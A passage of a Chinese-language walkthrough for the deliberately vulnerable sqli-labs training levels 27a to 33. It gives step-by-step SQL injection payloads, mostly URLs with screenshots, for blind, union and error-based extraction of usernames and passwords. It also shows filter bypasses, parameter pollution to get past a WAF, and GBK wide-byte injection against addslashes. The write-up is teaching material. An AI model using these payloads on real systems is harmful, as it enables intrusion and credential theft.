![1790858815286-81aa38b1-9062-44d7-9908-77ee096a91ea.png](./img/285943702/1790858815286-81aa38b1-9062-44d7-9908-77ee096a91ea-451796.png)

**5）时间盲注**

```plain
?id=1"%0a%26%26%0aif(length(database())=8,sleep(5),0)%0a%26%26%0a"1"="1
?id=1"%0a%26%26%0aif(ascii(substr(database(),1,1))=115,sleep(5),0)%0a%26%26%0a"1"="1
```

![1790859027361-9ca29e24-f455-43bc-be82-0681a079e2e7.png](./img/285943702/1790859027361-9ca29e24-f455-43bc-be82-0681a079e2e7-637539.png)

![1790859129357-2548c5b6-1b32-41ff-8583-7c75317a95f9.png](./img/285943702/1790859129357-2548c5b6-1b32-41ff-8583-7c75317a95f9-877420.png)

**6）猜表与数据**

```plain
?id=1"%0a%26%26%0a(sElEcT%0acount(1)%0afrom%0ainformation_schema.tables%0awhere%0atable_schema=database()%0a%26%26%0atable_name='users')>0%0a%26%26%0a"1"="1
```

若 select 仍被剥，改为双写：

```plain
seselselectect
```

information_schema 含 or 时，视本关是否过滤 or 决定是否双写 infoorrmation_schema（27a 若未滤 or 则不必）。

![1790860076619-f1f70077-6d13-4ccd-b2de-7f4818c4f066.png](./img/285943702/1790860076619-f1f70077-6d13-4ccd-b2de-7f4818c4f066-573790.png)

#### 要点小结

| 点 | 说明 |
| --- | --- |
| 与 Less-27 | 过滤思路相近；本关双引号 + 盲注 |
| 关键字 | 大小写混写 / 双写 union、select |
| 主手法 | 布尔或时间；不要依赖报错回显 |

***

### Less-28：GET · 过滤「union + 空白 + select」整体

#### 关卡信息

| 项目 | 说明 |
| --- | --- |
| 路径 | `/Less-28/?id=1` |
| 闭合 | 常见为 `')`（以报错为准，部分环境为 `'`） |
| 过滤内容 | 注释、空格，以及正则类似 `union\s+select`**（忽略大小写）** 的整段匹配 |
| 特点 | 单独的 `union` 或 `select` 不一定删；**连在一起的 union+空白+select** 会被去掉 |
| 主攻手法 | 打断连续匹配（如 `union/**/select` 若 `/*` 可用；或 `union%0aselect` 视 `\s` 定义；或 `union all select`；或中间插入注释/双写） |

#### 源码逻辑（理解用）

典型黑名单包含：

```latex
preg_replace('/union\s+select/i', "", $id);
```

以及去掉空格、`#`、`--`、`/*` 等。绕过思路是让 payload **匹配不到** `union\s+select` 这一整段。

#### 解题步骤

**1）确认闭合**

```latex
?id=1'
?id=1')
?id=1')%0a%26%26%0a('1
```

以本地报错为准；下文以 `')` 为例，若是 `'` 则去掉括号。

![1790861730645-7f7ea64c-4939-4b8c-b9c0-7201ca69ca75.png](./img/285943702/1790861730645-7f7ea64c-4939-4b8c-b9c0-7201ca69ca75-942698.png)

**2）确认 union select 被连删**

```latex
?id=111')%0aunion%0aselect%0a1,2,3%0a%26%26%0a('1')=('1')=('1
```

若失败，试打断：

```latex
?id=111')%0aunion%0aall%0aselect%0a1,2,3%0a%26%26%0a('1')=('1
```

或双写拆词：

```latex
?id=111')%0auniounionn%0aselect%0a1,2,3%0a%26%26%0a('1')=('1
```

（具体哪种有效取决于正则是否只删一次、是否含 `all`。）

![1790863599410-0d440e22-4e63-4ed1-8288-4c542f7949f7.png](./img/285943702/1790863599410-0d440e22-4e63-4ed1-8288-4c542f7949f7-110577.png)

**3）测列数**

```latex
?id=1')%0aorder%0aby%0a1%0a%26%26%0a('1')=('1
?id=1')%0aorder%0aby%0a2%0a%26%26%0a('1')=('1
?id=1')%0aorder%0aby%0a3%0a%26%26%0a('1')=('1
```

![1790864999345-965a8015-eb80-42c2-9841-51aafe01800f.png](./img/285943702/1790864999345-965a8015-eb80-42c2-9841-51aafe01800f-474809.png)

**4）取数据**

```latex
?id=111')%0aunion%0aall%0aselect%0a1,database(),3%0a%26%26%0a('1')=('1

?id=111')%0aunion%0aall%0aselect%0a1,group_concat(table_name),3%0afrom%0ainformation_schema.tables%0awhere%0atable_schema=database()%26%26%0a('1')=('1

?id=111')%0aunion%0aall%0aselect%0a1,group_concat(column_name),3%0afrom%0ainformation_schema.columns%0awhere%0atable_schema='security'%0a%26%26%0atable_name='users'%0a%26%26%0a('1')=('1

```

```latex
?id=111')%0aunion%0aall%0aselect%0a1,group_concat(username,0x3a,password),3%0afrom%0ausers%0awhere%0a('1')=('1
```

![1790868240123-86cd68a3-947b-49f5-a50b-a17e3515890e.png](./img/285943702/1790868240123-86cd68a3-947b-49f5-a50b-a17e3515890e-692132.png)

![1790868492303-c558d3d9-3410-441d-8f5a-003f6a45f27f.png](./img/285943702/1790868492303-c558d3d9-3410-441d-8f5a-003f6a45f27f-001412.png)

![1790869252969-b251bd05-f934-4c18-8f7e-36f276e4a43d.png](./img/285943702/1790869252969-b251bd05-f934-4c18-8f7e-36f276e4a43d-035489.png)

#### 要点小结

| 点 | 说明 |
| --- | --- |
| 与 Less-27 | 27 常分别删 union/select；28 侧重删「union+空白+select」整段 |
| 绕过 | `union all select`、双写、其它空白/插入打乱 |
| 注释与空格 | 仍常被过滤，靠 `%0a` + 尾部逻辑闭合 |

***

### Less-28a：GET · 过滤 union\s+select · ') 闭合 · 盲注

#### 关卡信息

| 项目 | 说明 |
| --- | --- |
| 路径 | /Less-28a/?id=1 |
| 注入方式 | GET |
| 闭合 | 常见 **')** |
| 过滤内容 | 与 Less-28 类似：注释、空格，以及 **union\s+select**\*\*（忽略大小写）\*\* 整段 |
| 与 Less-28 的差异 | 更偏向**无报错盲注**；部分版本黑名单更“干净”或略有不同，以源码为准 |
| 典型 SQL 形态 | ... WHERE id=('$id') ... |

#### 源码逻辑（理解用）

重点仍是：不能出现“union + 空白 + select”连续模式；空格和注释常被去掉。盲注场景下，甚至可以**少用或不用 union**，直接用 and/&& + if/substr 猜数据。

#### 解题步骤

**1）确认闭合与真假**

```plain
?id=1')
?id=1')%26%26(1=1)%26%26('1
?id=1')%26%26(1=2)%26%26('1
```

或带换行：

```plain
?id=1')%0a%26%26%0a(1=1)%0a%26%26%0a('1'='1

?id=1') and (1=1) and ('1'='1
```

![1790912881202-cfa95d3b-1b17-43ce-84ba-d702202c2b12.png](./img/285943702/1790912881202-cfa95d3b-1b17-43ce-84ba-d702202c2b12-708440.png)

![1790912904732-34ac2326-bc52-4f66-8819-0c2151cb7090.png](./img/285943702/1790912904732-34ac2326-bc52-4f66-8819-0c2151cb7090-580169.png)

![1790913027535-aa11b42d-d5b7-4029-805f-d4fc408499a0.png](./img/285943702/1790913027535-aa11b42d-d5b7-4029-805f-d4fc408499a0-292793.png)

**2）确认 union select 整段过滤（可选）**

```plain
?id=-1') union all select 1,2,3 and ('1'='1
```

失败则试：

```plain
?id=-1')%0aunion%0aselect%0a1,2,3%0a%26%26%0a('1
?id=-1')%0auniounionn%0aselect%0a1,2,3%0a%26%26%0a('1
```

盲注关可跳过联合，直接做条件判断。

![1790913284440-484b0029-d4fe-427f-bf6d-ac6b9c3dff61.png](./img/285943702/1790913284440-484b0029-d4fe-427f-bf6d-ac6b9c3dff61-166415.png)

![1790913502694-ddd23042-ae4e-4cf1-9b49-90341d19c25a.png](./img/285943702/1790913502694-ddd23042-ae4e-4cf1-9b49-90341d19c25a-991248.png)

**3）布尔盲注**

```plain
?id=1') and (length(database())=8) and ('1'='1
?id=1') and (substr(database(),1,1)='s') and ('1'='1
```

![1790913594949-55473129-9d26-44bd-9347-a0a149ba0d02.png](./img/285943702/1790913594949-55473129-9d26-44bd-9347-a0a149ba0d02-437686.png)

![1790913693396-e987a5ec-226c-4a0c-abd6-ee2c66afa5a6.png](./img/285943702/1790913693396-e987a5ec-226c-4a0c-abd6-ee2c66afa5a6-571435.png)

**4）时间盲注**

```plain
?id=1') and (if(length(database())=8,sleep(5),0)) and ('1'='1
?id=1') and (if(ascii(substr(database(),1,1))=115,sleep(5),0)) and ('1'='1
```

![1790913782385-4e02bc5e-0f85-418f-a00e-a977e34510e4.png](./img/285943702/1790913782385-4e02bc5e-0f85-418f-a00e-a977e34510e4-086762.png)

![1790913873824-ccc20a51-69d8-4f85-9cb7-74afe01a3582.png](./img/285943702/1790913873824-ccc20a51-69d8-4f85-9cb7-74afe01a3582-035895.png)

**5）枚举表名与密码**

```plain
?id=1') and ((select count(*) from information_schema.tables where table_schema=database() and table_name='users')>0) and ('1'='1
```

注意：子查询里的 select 单独出现通常**不会**命中 union\s+select；若仍被莫名其妙过滤，再混写/双写。

```plain
?id=1') and (substr((select password from users limit 0,1),1,1)='D') and ('1'='1
```

![1790922565713-34003659-d15c-4909-b9b9-0fff3b919f72.png](./img/285943702/1790922565713-34003659-d15c-4909-b9b9-0fff3b919f72-787683.png)

**6）若要坚持联合取数**

在打断 union select 的前提下，按本地列数构造，并保持 ') 与尾部闭合；无回显时联合意义不大，优先盲注脚本。

#### 要点小结

| 点 | 说明 |
| --- | --- |
| 与 Less-28 | 过滤整段 union\s+select 同类 |
| 闭合 | ') + 尾部 ('1 或等价 |
| 推荐路径 | 布尔/时间盲注，避免硬刚 union |
| 空格 | %0a / 括号 |

***

### Less-29：GET · WAF / HPP 参数污染 · 单引号字符型

#### 关卡信息

| 项目 | 说明 |
| --- | --- |
| 路径 | `/Less-29/login.php?id=1`（部分环境为 `index.jsp` + Tomcat，以你本地为准） |
| 注入方式 | GET |
| 类型 | 字符型（单引号） |
| 核心考点 | **HTTP 参数污染（HPP）** / 前后端对同名参数取值不一致（Impedance mismatch） |
| 典型 SQL 形态 | `SELECT * FROM users WHERE id='$id' LIMIT 0,1` |
| 主攻手法 | 两个同名 `id`：第一个过 WAF，第二个真正进 SQL |

#### 源码逻辑（理解用）

本关模拟「前面有一层 WAF / Java 取参，后面 PHP 再取参」：

1. **WAF 侧**（源码里常通过解析 `QUERY_STRING` 的 `java_implimentation()` + `whitelist()`）：
   * 往往只看**第一个** `id`
   * 要求必须是纯数字，否则跳转到 `hacked.php` 等拦截页
2. **业务侧**（`$_GET['id']`）：
   * PHP 对同名参数通常取**最后一个**
   * 该值直接拼进 SQL，可注入

因此构造：

```latex
?id=1&id=<恶意payload>
```

* 第一个 `id=1`：WAF 认为合法
* 第二个 `id=...`：进入数据库查询

#### 解题步骤

这关的正确的链接是：

```plain
http://sqli-labs/Less-29/login.php
```

![1790924848095-710f9ca0-e5dd-45ea-b131-a10067485e0e.png](./img/285943702/1790924848095-710f9ca0-e5dd-45ea-b131-a10067485e0e-313771.png)

**1）确认存在 WAF**

```latex
?id=1'
```

若被跳转到拦截页或提示非法，说明对参数做了白名单（常要求纯数字）。

![1790924880503-f1d09b32-9251-4991-a16d-ae0389d8a415.png](./img/285943702/1790924880503-f1d09b32-9251-4991-a16d-ae0389d8a415-069992.png)

**2）用 HPP 绕过**

```latex
?id=1&id=1'
```

* 若不再被 WAF 拦，并出现 SQL 语法错误 → 第二个 `id` 进了 SQL，且为**单引号**字符型。

![1790924975135-851899c0-e96e-4a91-9fd2-8257c8734960.png](./img/285943702/1790924975135-851899c0-e96e-4a91-9fd2-8257c8734960-240243.png)

**3）确认闭合与注释**

```latex
?id=1&id=1' --+
?id=1&id=1' %23
```

页面正常或逻辑符合预期，说明可用 `--+` / `#` 注释后续。

![1790925007411-f218adbe-cdd6-406e-8aa8-07e9e6ceffa8.png](./img/285943702/1790925007411-f218adbe-cdd6-406e-8aa8-07e9e6ceffa8-950732.png)

![1790925022759-76feb32f-52f9-4ec6-af34-d035010c8f96.png](./img/285943702/1790925022759-76feb32f-52f9-4ec6-af34-d035010c8f96-079365.png)

**4）判断列数（以本地为准）**

```latex
?id=1&id=1' order by 1--+
?id=1&id=1' order by 2--+
?id=1&id=1' order by 3--+
?id=1&id=1' order by 4--+
```

最后一个成功的数字即为列数。

![1790925335381-547b1fbd-84ff-4426-92fe-a7105a83faaf.png](./img/285943702/1790925335381-547b1fbd-84ff-4426-92fe-a7105a83faaf-701655.png)

![1790925347415-fb00e0fd-1d28-4116-b16c-da6f906028fe.png](./img/285943702/1790925347415-fb00e0fd-1d28-4116-b16c-da6f906028fe-048247.png)

**5）联合查询找显示位**

```latex
?id=1&id=-1' union select 1,2,3--+
```

观察哪一列出现在用户名/密码位置。

![1790925390916-c84ed6f5-118d-4f42-af9a-0faff999daa5.png](./img/285943702/1790925390916-c84ed6f5-118d-4f42-af9a-0faff999daa5-801797.png)

**6）取数据**

```latex
?id=1&id=-1' union select 1,database(),3--+
```

```latex
?id=1&id=-1' union select 1,group_concat(table_name),3 from information_schema.tables where table_schema='security'--+
```

```latex
?id=1&id=-1' union select 1,group_concat(column_name),3 from information_schema.columns where table_schema='security' and table_name='users'--+
```

```latex
?id=1&id=-1' union select 1,group_concat(username,0x3a,password),3 from users--+
```

![1790925414204-c585dc13-8230-4197-9b01-35f709fe76af.png](./img/285943702/1790925414204-c585dc13-8230-4197-9b01-35f709fe76af-122105.png)

![1790925474415-2045e880-01d0-474e-afe2-d4cefb6be367.png](./img/285943702/1790925474415-2045e880-01d0-474e-afe2-d4cefb6be367-019802.png)

![1790925509820-3389db64-bb1b-4f01-978e-0ab5dddfe759.png](./img/285943702/1790925509820-3389db64-bb1b-4f01-978e-0ab5dddfe759-517139.png)

![1790925580472-a6b01bf8-23bc-418c-84d7-9e6a14c5a565.png](./img/285943702/1790925580472-a6b01bf8-23bc-418c-84d7-9e6a14c5a565-422631.png)

**7）报错注入备选**

```latex
?id=1&id=1' and updatexml(1,concat(0x7e,(select database()),0x7e),1)--+

?id=1&id=-1' and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1) --+

?id=1&id=-1' and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='users'),0x7e),1) --+

?id=1&id=-1' and updatexml(1,concat(0x7e,(select group_concat(username,0x3a,password) from users),0x7e),1) --+
```

![1790925643480-e9f5575e-6605-44f9-821e-522baf19f064.png](./img/285943702/1790925643480-e9f5575e-6605-44f9-821e-522baf19f064-921276.png)

![1790925854179-50f531e2-ba05-4e23-a155-33ec2f43b343.png](./img/285943702/1790925854179-50f531e2-ba05-4e23-a155-33ec2f43b343-987624.png)

**8）补充：长字符串截断类绕过（部分源码实现）**

若 `java_implimentation()` 只截取第一个 `id=` 后固定长度（如约 30 字符）送给白名单，而 SQL 使用完整 `$_GET['id']`，则超长数字前缀也可能绕过检测。仍以 **HPP 双参数** 为标准解法。

#### 要点小结

| 点 | 说明 |
| --- | --- |
| 核心 | WAF 看第一个 `id`，PHP 用最后一个 `id` |
| 固定写法 | `?id=数字&id=注入payload` |
| 闭合 | 单引号 `'` |
| 与 Less-1 | 绕过 WAF 后，注入手法与基础联合/报错相同 |

***

### Less-30：GET · WAF / HPP 参数污染 · 双引号字符型

#### 关卡信息

| 项目 | 说明 |
| --- | --- |
| 路径 | `/Less-30/login.php?id=1` |
| 注入方式 | GET |
| 类型 | 字符型（**双引号**包裹） |
| 核心考点 | 与 Less-29 相同：**HPP + 前后端取参不一致** |
| 典型 SQL 形态 | `SELECT * FROM users WHERE id="$id" LIMIT 0,1`（源码常为 `$id='"'.$id.'"'`） |
| 主攻手法 | `?id=1&id=<双引号payload>` |

#### 源码逻辑（理解用）

WAF / 白名单逻辑与 Less-29 同类：第一个 `id` 必须像纯数字。\
业务层仍取最后一个 `id`，但拼进 SQL 时用的是**双引号**，因此闭合符从 `'` 换成 `"`。

#### 解题步骤

这关的正确的链接是：

```plain
http://sqli-labs/Less-30/login.php
```

![1790926321342-524f7c52-3a0e-48eb-b44c-085dfc029c84.png](./img/285943702/1790926321342-524f7c52-3a0e-48eb-b44c-085dfc029c84-978846.png)

**1）单参数被拦**

```latex
?id=1"
```

通常触发 WAF 拦截。

![1790926342957-841f1379-0b5d-4faf-b7fb-92c1d99a7d55.png](./img/285943702/1790926342957-841f1379-0b5d-4faf-b7fb-92c1d99a7d55-383653.png)

**2）HPP 绕过并确认双引号**

```latex
?id=1&id=1"
```

出现 SQL 语法错误或异常 → 第二个参数进入查询。

```latex
?id=1&id=1" --+
```

若恢复正常，说明双引号闭合 + 注释可用。

![1790926385709-a13b1864-dc73-42ce-98f6-79e928f38516.png](./img/285943702/1790926385709-a13b1864-dc73-42ce-98f6-79e928f38516-436262.png)

![1790926406905-60cc42a6-b385-435f-9342-7e93b6e743d8.png](./img/285943702/1790926406905-60cc42a6-b385-435f-9342-7e93b6e743d8-965707.png)

**3）判断列数**

```latex
?id=1&id=1" order by 1--+
?id=1&id=1" order by 2--+
?id=1&id=1" order by 3--+
?id=1&id=1" order by 4--+
```

以本地最后一个成功的 `order by` 为准。

![1790926428042-2502a172-d801-484a-9a6c-40e8917156ca.png](./img/285943702/1790926428042-2502a172-d801-484a-9a6c-40e8917156ca-041661.png)

![1790926440199-020f07d8-2741-4567-a6e7-d1871848d33e.png](./img/285943702/1790926440199-020f07d8-2741-4567-a6e7-d1871848d33e-017310.png)

**4）联合查询**

```latex
?id=1&id=-1" union select 1,2,3--+
```

![1790926529853-c76bf952-7e91-47fa-be39-51570aea8c3e.png](./img/285943702/1790926529853-c76bf952-7e91-47fa-be39-51570aea8c3e-926472.png)

**5）取库、表、列、数据**

```latex
?id=1&id=-1" union select 1,database(),3--+
```

```latex
?id=1&id=-1" union select 1,group_concat(table_name),3 from information_schema.tables where table_schema='security'--+
```

```latex
?id=1&id=-1" union select 1,group_concat(column_name),3 from information_schema.columns where table_schema='security' and table_name='users'--+
```

```latex
?id=1&id=-1" union select 1,group_concat(username,0x3a,password),3 from users--+
```

![1790926554514-14450560-a70d-4c1e-96d2-7644cd29708b.png](./img/285943702/1790926554514-14450560-a70d-4c1e-96d2-7644cd29708b-584127.png)

![1790926914217-7682a32b-a1f9-49c7-9eb9-71bfda39ffde.png](./img/285943702/1790926914217-7682a32b-a1f9-49c7-9eb9-71bfda39ffde-624057.png)

**6）报错注入备选**

```latex
?id=1&id=1" and updatexml(1,concat(0x7e,(select database()),0x7e),1)--+

?id=1&id=1" and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1) --+

?id=1&id=1" and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='users'),0x7e),1) --+

?id=1&id=1" and updatexml(1,concat(0x7e,(select group_concat(username,0x3a,password) from users),0x7e),1) --+
```

![1790926983844-5a611359-838f-4ecb-bfde-54fb82a5450c.png](./img/285943702/1790926983844-5a611359-838f-4ecb-bfde-54fb82a5450c-763407.png)

![1790927101829-af1293f8-7682-4a73-a46e-6c8ef19681de.png](./img/285943702/1790927101829-af1293f8-7682-4a73-a46e-6c8ef19681de-185017.png)

**7）与 Less-29 对照练习**

| 项目 | Less-29 | Less-30 |
| --- | --- | --- |
| HPP 形式 | `?id=1&id=...` | 相同 |
| 闭合 | `'` | `"` |
| 联合示例 | `id=-1' union select ...` | `id=-1" union select ...` |
| WAF 思路 | 第一个 id 纯数字 | 相同 |

#### 要点小结

| 点 | 说明 |
| --- | --- |
| 核心 | 仍是 HPP，只改闭合符 |
| 固定前缀 | 第一个 `id=1`（或其它纯数字）骗过白名单 |
| 注入位置 | 第二个 `id` |
| 列数 | 不要沿用其它关的假设，本地 `order by` 实测 |

***

### Less-31：GET · WAF / HPP 参数污染 · 双引号 + 括号 `")`

#### 关卡信息

| 项目 | 说明 |
| --- | --- |
| 路径 | `/Less-31/login.php?id=1` |
| 注入方式 | GET |
| 类型 | 字符型 |
| 闭合方式 | `")`（双引号 + 右括号） |
| 核心考点 | 与 Less-29/30 相同：**HPP（HTTP 参数污染）** / 前后端对同名参数取值不一致 |
| 典型 SQL 形态 | `... WHERE id=("$id") ...` 一类 |
| 主攻手法 | `?id=1&id=<带 ") 的 payload>` |

#### 源码逻辑（理解用）

1. **WAF / 白名单**：解析查询串时往往只检查**第一个** `id`，要求为纯数字，否则跳转拦截页。
2. **业务层**：`$_GET['id']` 取**最后一个**同名参数，再拼进带双引号和括号的 SQL。

因此第一个 `id` 负责“看起来合法”，第二个 `id` 负责真正注入；与 29、30 的差别主要在**闭合符**。

#### 解题步骤

这关的正确的链接是：

```plain
http://sqli-labs/Less-31/login.php
```

![1790928528880-f20d8c6d-e495-4caf-bf3a-97180d4c2e8d.png](./img/285943702/1790928528880-f20d8c6d-e495-4caf-bf3a-97180d4c2e8d-987256.png)

**1）确认 WAF 存在**

```latex
?id=1"
?id=1")
```

单参数带引号/括号时，常被拦截。

![1790928560544-a5d5956b-4228-4997-afe5-abb6f63fb2d9.png](./img/285943702/1790928560544-a5d5956b-4228-4997-afe5-abb6f63fb2d9-682222.png)

![1790928571154-c18bc5e1-6fa0-4a62-aa56-c848e8488c20.png](./img/285943702/1790928571154-c18bc5e1-6fa0-4a62-aa56-c848e8488c20-983065.png)

**2）HPP 绕过并确认闭合**

```latex
?id=1&id=1"
?id=1&id=1")
?id=1&id=1")--+
```

* 双参数后出现 SQL 语法错误或不被 WAF 踢走 → 第二个 `id` 进了 SQL
* `1")--+` 能让语句完整 → 闭合为 `")`

![1790928729627-331d5f84-d1b7-4ce5-82a6-1f673e69f229.png](./img/285943702/1790928729627-331d5f84-d1b7-4ce5-82a6-1f673e69f229-774020.png)

**3）判断列数（以本地为准）**

```latex
?id=1&id=1") order by 1--+
?id=1&id=1") order by 2--+
?id=1&id=1") order by 3--+
?id=1&id=1") order by 4--+
```

![1790928775763-cf5e0991-a48b-4d5d-b26c-ac51b420b01b.png](./img/285943702/1790928775763-cf5e0991-a48b-4d5d-b26c-ac51b420b01b-170101.png)

![1790928786951-d7249863-a55a-4bf2-9c36-cb5354b56e61.png](./img/285943702/1790928786951-d7249863-a55a-4bf2-9c36-cb5354b56e61-820051.png)

**4）联合查询找显示位**

```latex
?id=1&id=-1") union select 1,2,3--+
```

![1790928851186-89ce16c4-274c-4a7f-9b78-363cd8b20288.png](./img/285943702/1790928851186-89ce16c4-274c-4a7f-9b78-363cd8b20288-098821.png)

**5）取库、表、列、数据**

```latex
?id=1&id=-1") union select 1,database(),3--+
```

```latex
?id=1&id=-1") union select 1,group_concat(table_name),3 from information_schema.tables where table_schema='security'--+
```

```latex
?id=1&id=-1") union select 1,group_concat(column_name),3 from information_schema.columns where table_schema='security' and table_name='users'--+
```

```latex
?id=1&id=-1") union select 1,group_concat(username,0x3a,password),3 from users--+
```

![1790928879015-32b6b153-5240-45ad-9b63-838175b38ec4.png](./img/285943702/1790928879015-32b6b153-5240-45ad-9b63-838175b38ec4-312179.png)

![1790929051293-df30167a-cf40-44bc-9417-a64db15894be.png](./img/285943702/1790929051293-df30167a-cf40-44bc-9417-a64db15894be-763535.png)

**6）报错注入备选**

```latex
?id=1&id=1") and updatexml(1,concat(0x7e,(select database()),0x7e),1)--+

?id=1&id=1") and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1) --+

?id=1&id=1") and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='users'),0x7e),1) --+

?id=1&id=1") and updatexml(1,concat(0x7e,(select group_concat(username,0x3a,password) from users),0x7e),1) --+
```

![1790929216501-d9917c8a-fe6e-4271-9560-b4362ce7f244.png](./img/285943702/1790929216501-d9917c8a-fe6e-4271-9560-b4362ce7f244-625893.png)

![1790929200942-69c6ddb1-b41c-4a52-90cd-1f403710c495.png](./img/285943702/1790929200942-69c6ddb1-b41c-4a52-90cd-1f403710c495-069023.png)

**7）与 29、30 对照**

| 关卡 | HPP 形式 | 第二个 id 闭合 |
| --- | --- | --- |
| 29 | `?id=1&id=...` | `'` |
| 30 | `?id=1&id=...` | `"` |
| 31 | `?id=1&id=...` | `")` |

#### 要点小结

| 点 | 说明 |
| --- | --- |
| 核心 | 仍是「第一个 id 过 WAF，最后一个 id 进 SQL」 |
| 闭合 | `")`，不要只写 `"` |
| 列数 | 本地 `order by` 实测，再写 `union select` |

***

### Less-32：GET · 绕过 addslashes 类转义 · 宽字节注入（GBK）

#### 关卡信息

| 项目 | 说明 |
| --- | --- |
| 路径 | `/Less-32/?id=1` |
| 注入方式 | GET |
| 类型 | 字符型（单引号）+ **转义** |
| 过滤 | 对 `\`、`'`、`"` 做类似 `addslashes` 的转义（本关多为自定义 `check_addslashes()`） |
| 关键条件 | 连接库时使用 `SET NAMES gbk`（或等价 GBK 客户端编码） |
| 主攻手法 | **宽字节注入**：`%df'` 吃掉转义产生的反斜杠 |

#### 源码逻辑（理解用）

1. 输入中的 `'` 会被转成 `\'`（前面多一个反斜杠 `\`，字节为 `0x5c`）。
2. 若按 UTF-8 理解，单引号仍被转义，无法闭合字符串。
3. 若 MySQL 客户端/连接编码为 **GBK**：
   * GBK 中很多汉字为**两字节**
   * 特意在 `'` 前加高位字节（常用 `%df`）
   * 转义后字节序列类似：`%df` + `%5c`（反斜杠）+ `%27`（引号）
   * GBK 会把 `%df%5c` 当成一个汉字，“吃掉”反斜杠，留下单独的 `'` 去闭合 SQL

结果：转义形同虚设，重新变成单引号字符型注入。

#### 解题步骤

**1）普通单引号无效**

```latex
?id=1'
```

因被转成 `\'`，往往**不会**出现可用的语法突破（或表现与未注入不同）。

![1790929540238-9da4e184-a9d5-4544-92f1-e99658cf7acd.png](./img/285943702/1790929540238-9da4e184-a9d5-4544-92f1-e99658cf7acd-750801.png)

**2）宽字节确认注入**

```latex
?id=1%df'
?id=1%df%27
```

出现 SQL 语法错误 → 宽字节绕过成功，闭合仍按单引号理解。

![1790929768931-219da0f7-13f3-40c0-9c28-f794e3be488a.png](./img/285943702/1790929768931-219da0f7-13f3-40c0-9c28-f794e3be488a-426124.png)

![1790929781981-a57c58db-19aa-4acf-a1cc-2eaad120fc7f.png](./img/285943702/1790929781981-a57c58db-19aa-4acf-a1cc-2eaad120fc7f-841711.png)

**3）宽字节 + 注释**

```latex
?id=1%df'%20--+
?id=1%df' --+
```

![1790929815559-23dc4c37-3516-4af7-9859-e098194153cb.png](./img/285943702/1790929815559-23dc4c37-3516-4af7-9859-e098194153cb-745879.png)

**4）判断列数**

```latex
?id=1%df' order by 1--+
?id=1%df' order by 2--+
?id=1%df' order by 3--+
?id=1%df' order by 4--+
```

以本地成功结果为准。

![1790929844905-cd882eb5-414e-4e9a-83e0-d62281d85f37.png](./img/285943702/1790929844905-cd882eb5-414e-4e9a-83e0-d62281d85f37-235452.png)

![1790929859043-5449ff10-b60d-4ee0-8157-313e38401bb5.png](./img/285943702/1790929859043-5449ff10-b60d-4ee0-8157-313e38401bb5-706612.png)

**5）联合查询**

```latex
?id=-1%df' union select 1,2,3--+
```

![1790929891013-85a284af-841f-49be-92d9-18e6d247217b.png](./img/285943702/1790929891013-85a284af-841f-49be-92d9-18e6d247217b-085632.png)

**6）取数据**

```latex
?id=-1%df' union select 1,database(),3--+
```

![1790929912355-0e0cfc53-faeb-4e86-b337-3ecff5e6a209.png](./img/285943702/1790929912355-0e0cfc53-faeb-4e86-b337-3ecff5e6a209-038793.png)

```latex
?id=-1%df' union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()--+
```

注意此处数据库名要用十六进制 (HEX) 编码替代，避免单引号的使用。

MySQL 中 `table_name=0x7573657273` 等价于 `table_name='users'`（hex 字面量在字符串比较时自动转换），而且不含任何引号字符，addslashes 无从下手。

这里需要注意，不能出现单引号，于是我们在 users 前面加入 0x ，然后将 users 转化为16进制。

![1790931080654-2d2f3834-d16b-4681-b00c-c7293bb4806e.png](./img/285943702/1790931080654-2d2f3834-d16b-4681-b00c-c7293bb4806e-445736.png)

```latex
?id=-1%df' union select 1,group_concat(column_name),3 from information_schema.columns where table_schema=database() and table_name=0x7573657273--+
```

![1790931124035-595281d0-ab10-411a-a6e6-5b9a06106889.png](./img/285943702/1790931124035-595281d0-ab10-411a-a6e6-5b9a06106889-821883.png)

```latex
?id=-1%df' union select 1,group_concat(username,0x3a,password),3 from users--+
```

![1790931214393-54278f86-0019-4680-883c-d36c3fee8a91.png](./img/285943702/1790931214393-54278f86-0019-4680-883c-d36c3fee8a91-977562.png)

**7）报错注入备选**

```latex
?id=1%df' and updatexml(1,concat(0x7e,(select database()),0x7e),1)--+

?id=1%df' and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1) --+

?id=1%df' and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=0x7573657273),0x7e),1) --+

?id=1%df' and updatexml(1,concat(0x7e,(select group_concat(username,0x3a,password) from users),0x7e),1) --+
```

![1790931283586-5633d8e4-aec0-41a6-958b-45cb41efb782.png](./img/285943702/1790931283586-5633d8e4-aec0-41a6-958b-45cb41efb782-051873.png)

![1790931432537-cbd0fc11-f02b-4146-82e6-d851ae3c447f.png](./img/285943702/1790931432537-cbd0fc11-f02b-4146-82e6-d851ae3c447f-742627.png)

**8）注意点**

| 点 | 说明 |
| --- | --- |
| 编码 | 必须是 GBK（或其它会把 `%df%5c` 当多字节字符的编码）；UTF-8 下通常无效 |
| URL | 浏览器可能把 `'` 编成 `%27`，写成 `%df%27` 更稳 |
| 其它宽字节 | 有时也试 `%a1`、`%f1` 等，本关经典为 `%df` |
| 与过滤函数 | 自定义转义或 `addslashes()` 原理相同：都是加 `\`，再被宽字节吃掉 |

#### 要点小结

| 点 | 说明 |
| --- | --- |
| 现象 | 普通 `'` 被转义；`%df'` 可注入 |
| 本质 | GBK 多字节 + 转义反斜杠被“吞掉” |
| 固定前缀 | 注入片段前加 `%df`（在闭合引号前） |
| 防御对照 | 统一 UTF-8；慎用仅依赖转义的拼接；优先预编译 |

***

### Less-33：GET · 绕过 `addslashes()` · 宽字节注入（GBK）

#### 关卡信息

| 项目 | 说明 |
| --- | --- |
| 路径 | `/Less-33/?id=1` |
| 注入方式 | GET |
| 类型 | 字符型（单引号）+ 转义 |
| 过滤函数 | PHP 内置 `addslashes()`（对 `'`、`"`、`\`、NUL 前加反斜杠） |
